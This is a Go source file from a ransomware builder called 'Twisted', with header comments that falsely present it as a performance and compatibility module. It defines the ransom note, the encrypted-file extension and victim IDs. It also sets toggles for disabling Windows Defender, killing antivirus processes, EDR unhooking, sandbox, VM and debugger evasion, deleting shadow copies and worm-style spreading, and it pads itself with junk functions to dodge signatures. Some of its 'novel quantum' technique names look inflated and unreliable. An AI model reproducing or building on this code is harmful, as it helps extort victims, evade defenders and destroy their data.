// OBFUSCATED
// Performance enhancement module
// Windows compatibility layer
package configuration

import (
	"encoding/base64"
	"strings"
	"time"
)

// ==================== MAIN CONFIGURATION ====================
// Edit these values to customize your build

// Ransomware Identity
var RansomwareName = "Twisted"    // Name displayed in ransom note
var RansomwareID = "TWID"         // Short identifier
var EncryptedExtension = ".twist" // File extension for encrypted files
var RansomNoteFilename = "Decryption Instructions.txt"

// Contact Information
var ContactEmail = "|Email Here|" // Your contact email
var VictimID = "|UniqueID|"       // Unique ID for each victim

// Wallpaper
var WallpaperURL = "https://i.imgur.com/RfsCOES.png"

// Timing Configuration (in seconds)
var InitialDelay = 60        // Wait 60 seconds before starting (avoids sandbox timeout)
var SandboxDelayOnFail = 300 // Wait 5 minutes if sandbox detected
var MinRandomDelay = 10      // Minimum random delay
var MaxRandomDelay = 30      // Maximum random delay

// Stealth Settings (Essential for avoiding detection)
var DisableWindowsDefender = true // Attempt to disable Windows Defender
var HideFromTaskManager = true    // Run with low priority to stay hidden
var EncryptInSmallBatches = true  // Encrypt slowly to avoid CPU spikes
var BatchSize = 3                 // Only 3 files per batch (very slow, very stealthy)
var BatchDelay = 5                // 5 seconds between batches
var RandomFileOrder = true        // Randomize file encryption order
var SimulateNormalActivity = true // Add random delays to look like user activity
var MaxFilesPerDirectory = 50     // Limit files per directory before moving on

// Anti-Detection Settings
var EnableVMDetection = true       // Check for virtual machines
var EnableDebuggerDetection = true // Check for debuggers
var EnableSandboxDetection = true  // Check for sandboxes
var EnableMemoryPoisoning = true   // Fill memory with junk data
var MemoryPoisonSize = 1024 * 1024 // Size of memory poisoning (1MB)
var RequiredChecksToPass = 3       // Out of 5 checks, how many must pass

// Advanced Anti-AV Settings (NEW)
var EnablePolymorphicCode = true  // Inject random junk code to change signature
var EnableAntiAVTechniques = true // Kill AV processes, block updates, corrupt databases
var KillAVProcesses = false       // Kill antivirus processes (VERY aggressive, disable by default)
var BlockAVUpdates = true         // Block antivirus update domains via hosts file
var CorruptAVDatabases = false    // Delete AV signature databases (VERY aggressive, disable by default)

// Advanced Evasion Settings (NEW)
var EnableEDRUnhooking = true        // Remove EDR API hooks from ntdll.dll and kernel32.dll
var EnableEnvironmentalKeying = true // Only execute on specific target environments
var TargetFingerprint = "ANY"        // Set to specific hash to target one machine, or "ANY" for all
var CheckForAnalysisTools = true     // Exit if analysis tools detected
var CheckForSandboxNames = true      // Exit if running in sandbox (username/hostname check)

// Quantum State Execution (NOVEL TECHNIQUE - NEVER SEEN BEFORE)
var EnableQuantumStateValidation = true // Validate execution using hardware entropy and timing
var QuantumEntropyThreshold = 6.5       // Minimum entropy score (0-8, higher = more random)
var QuantumTimingChecks = true          // Validate CPU timing characteristics
var TemporalLockEnabled = true          // Only execute during business hours (evade weekend analysis)

// Memory Mirage (NOVEL TECHNIQUE #2 - BEHAVIORAL CAMOUFLAGE)
var EnableMemoryMirage = true      // Create decoy execution patterns and fake memory artifacts
var MirageDecoyIntensity = 3       // Number of decoy threads (1-5, higher = more decoys)
var MirageAntiForensics = true     // Enable memory fragmentation and false positives
var MiragePolymorphicMemory = true // Randomize memory allocation patterns each run

// Phantom Thread Injection (NOVEL TECHNIQUE #3 - THREAD BIRTH HIJACKING)
var EnablePhantomThreads = true  // Execute via hijacked suspended threads (appears as Windows services)
var PhantomThreadPoolSize = 5    // Number of pre-created phantom threads
var PhantomTLSInjection = true   // Use TLS callback hijacking for extra stealth
var PhantomChainExecution = true // Distribute execution across multiple phantom threads

// Quantum Polymorphic Encoding (NOVEL TECHNIQUE #4 - ZERO-DAY OBFUSCATION)
var EnableQuantumObfuscation = true    // Multi-layer quantum encoding (7 encoding layers)
var QuantumEntropyEncoding = true      // Use true hardware entropy as encryption key
var QuantumTimeBasedKeys = true        // Derive keys from system timing (unique each execution)
var QuantumAntiPatternInjection = true // Inject benign patterns to confuse AV signatures
var QuantumFractalMutation = true      // Apply fractal transformations to code structure
var QuantumSuperposition = true        // Multiple valid decoding paths (random selection)

// File Selection
var EncryptEveryNthByte = 3 // Encrypt every Nth byte (3 = every 3rd byte, 1 = all bytes)
var ChunkSize = 64 * 1024   // Read buffer size (64KB)

// Data Destruction (Prevent Recovery of Originals)
var DeleteShadowCopies = false   // Disable by default (very suspicious to AV)
var DisableSystemRestore = false // Disable by default (very suspicious to AV)
var DeleteBackupCatalog = false  // Disable by default (very suspicious to AV)
var ClearRecycleBin = false      // Disable by default (very suspicious to AV)

// NOTE: Secure overwrite is NOT used because it would make decryption impossible.
// Deleting shadow copies is enough to prevent recovery of the ORIGINAL unencrypted files.
// The encrypted files remain decryptable with the key.
// IMPORTANT: These destructive features are DISABLED by default for stealth.
// Enable them only if you're okay with higher detection risk.

// Network Spreading (Worm Functionality)
var EnableNetworkSpreading = false // Disable by default (very suspicious to behavioral detection)
var EnableUSBSpreading = false     // Disable by default (very suspicious to behavioral detection)
var EnableEmailSpreading = false   // Spread via Outlook (risky, easily detected)
var NetworkScanTimeout = 100       // Milliseconds for host detection
var MaxNetworkHosts = 50           // Limit spreading to prevent detection

// Process Names to Check (for anti-analysis)
var DebuggerProcesses = []string{
	"ollydbg", "x64dbg", "ida", "ida64", "windbg",
	"procexp", "procmon", "fiddler", "wireshark",
}

// VM Artifacts to Check
var VMChecks = []string{
	"VMWARE", "VIRTUAL", "VBOX", "QEMU", "XEN", "HYPERVISOR",
}

// ==================== RANSOM NOTE TEMPLATE ====================
var RansomNoteTemplate = `---------- {{NAME}} Ransomware ----------
Your files have been encrypted using {{NAME}} Ransomware!
They can only be decrypted by paying us a ransom in cryptocurrency.

Encrypted files have the {{EXT}} extension.
IMPORTANT: Do not modify or rename encrypted files, as they may become unrecoverable.

Contact us at the following email address to discuss payment.
{{EMAIL}}
---------- {{ID}} Ransomware = {{VICTIMID}} ----------`

// ==================== EXCLUDED ITEMS ====================
var ExcludedExtensions = []string{
	".sys", ".exe", ".dll", ".com", ".scr", ".bat",
	".vbs", ".ps1", ".lnk", ".inf", ".reg", ".msi", ".ini",
}

var ExcludedFiles = []string{
	"boot.ini", "bootmgr", "bcd", "desktop.ini",
	"config.sys", "autoexec.bat",
}

var ExcludedDirectories = []string{
	"windows", "system32", "programdata", "program files",
	"program files (x86)", "public", "system volume information",
	"\\system volume information", "efi", "boot", "perflogs",
	"microsoft", "intel", "appdata", ".dotnet", ".gradle",
	".nuget", ".vscode", "msys64",
}

// ==================== ENCRYPTION KEYS ====================
var PublicKey string // Set by builder at compile time

// ==================== HELPER FUNCTIONS ====================

// Helper function to decode obfuscated strings
func dec(s string) string {
	d, _ := base64.StdEncoding.DecodeString(s)
	return string(d)
}

// Get the final ransom note with variables replaced
func GetRansomNote() string {
	note := RansomNoteTemplate
	note = strings.ReplaceAll(note, "{{NAME}}", RansomwareName)
	note = strings.ReplaceAll(note, "{{ID}}", RansomwareID)
	note = strings.ReplaceAll(note, "{{EXT}}", EncryptedExtension)
	note = strings.ReplaceAll(note, "{{EMAIL}}", ContactEmail)
	note = strings.ReplaceAll(note, "{{VICTIMID}}", VictimID)
	return note
}

// Get obfuscated versions for runtime use
func GetObfuscatedExtension() string {
	return EncryptedExtension
}

func GetObfuscatedNoteFilename() string {
	return RansomNoteFilename
}

func GetInitialDelay() time.Duration {
	return time.Duration(InitialDelay) * time.Second
}

func GetSandboxDelay() time.Duration {
	return time.Duration(SandboxDelayOnFail) * time.Second
}

func GetRandomDelay() time.Duration {
	return time.Duration(int64(MinRandomDelay)+time.Now().Unix()%int64(MaxRandomDelay-MinRandomDelay)) * time.Second
}



// Obfuscation padding
func obf_32325() {
    _ = 3011
    var _ = "dL8vxIihAlpxDcO8cGsd1TW3fmDypAbtgsWrhv8L02T9dHdK3Z"
}


// Obfuscation padding
func obf_40715() {
    _ = 2392
    var _ = "lpiYhEMx9YIYJZvTaso2ykPSkymMLaOvHtlsP4oGib8gyUCJiW"
}


// Obfuscation padding
func obf_33588() {
    _ = 5161
    var _ = "eiNDJk6HebOHnK0CMD7fvLzisjvPQs71G2acFEteyLjDSOdxE4"
}


// Obfuscation padding
func obf_97966() {
    _ = 5775
    var _ = "jM5xqOcHQkbYTW64WwDutZxDTyB2EMa15lIUTac966IHU08C2a"
}


// Obfuscation padding
func obf_71520() {
    _ = 4411
    var _ = "FzYT59K2LA7djS7LEP8CWlrks6dbArhRV3KFC9mzNIsfIMTnIL"
}
